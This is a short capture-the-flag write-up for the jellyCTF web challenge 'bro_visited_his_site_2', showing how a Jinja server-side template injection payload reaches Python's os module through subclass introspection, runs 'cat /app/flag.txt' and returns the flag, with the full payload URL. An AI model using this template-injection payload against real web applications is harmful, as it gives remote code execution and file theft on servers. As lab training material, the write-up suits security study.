# bro_visited_his_site_2
Point count: 100pts

Difficulty: easy

Provided files: N/A (same as first version)

Url: https://bro-visited-his-site.jellyc.tf/

Description: ok, but can you get /app/flag.txt
# 

This is exactly the same vulnerability as the first edition of this challenge, please read that before continuing here.

Using the same payload as the last challenge, we can just modify it to read /app/flag.txt: `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /app/flag.txt").read()}}{%endif%}{% endfor %}`

Once done, we are presented with:

` jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}pilled jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}maxxer`

And there is our flag!

Final flag: `jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}`

Final payload: `https://bro-visited-his-site.jellyc.tf/response?word={% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat /app/flag.txt").read()}}{%endif%}{% endfor %}`

